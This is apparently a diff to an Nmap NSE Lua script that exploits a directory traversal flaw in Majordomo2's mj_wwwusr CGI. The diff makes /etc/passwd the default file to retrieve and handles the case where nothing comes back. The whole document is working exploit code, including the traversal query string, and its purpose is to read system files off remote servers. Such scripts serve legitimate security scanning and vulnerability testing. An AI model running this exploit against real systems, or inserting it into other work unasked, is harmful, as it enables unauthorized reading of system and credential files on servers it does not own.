@@ -46,6 +46,7 @@ portrule = shortport.http
 
 local MAJORDOMO2_EXPLOIT_QRY = "?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../.."
 local MAJORDOMO2_EXPLOIT_URI = "/cgi-bin/mj_wwwusr"
+local DEFAULT_RFILE = '/etc/passwd'
 
 ---
 -- MAIN
@@ -56,7 +57,7 @@ action = function(host, port)
 
   filewrite = stdnse.get_script_args("http-majordomo2-dir-traversal.outfile")
   uri = stdnse.get_script_args("http-majordomo2-dir-traversal.uri") or MAJORDOMO2_EXPLOIT_URI
-  rfile = stdnse.get_script_args("http-majordomo2-dir-traversal.rfile")
+  rfile = stdnse.get_script_args("http-majordomo2-dir-traversal.rfile") or DEFAULT_RFILE
 
   payload = uri .. MAJORDOMO2_EXPLOIT_QRY
 
@@ -68,9 +69,13 @@ action = function(host, port)
   end
   local _
   _, _, rfile_content = string.find(contents, '<pre>(.*)<!%-%- Majordomo help_foot format file %-%->')
-  output_lines[#output_lines+1] = rfile.." was found:\n"..rfile_content
-  if filewrite then
-    local status, err = exploit.write_file(filewrite,  rfile_content, rfile)
+  if rfile_content then
+    output_lines[#output_lines+1] = rfile.." was found:\n"..rfile_content
+    if filewrite then
+      local status, err = exploit.write_file(filewrite,  rfile_content, rfile)
+    end
+    return stdnse.strjoin("\n", output_lines)
+  else
+    return
   end
-  return stdnse.strjoin("\n", output_lines)
 end
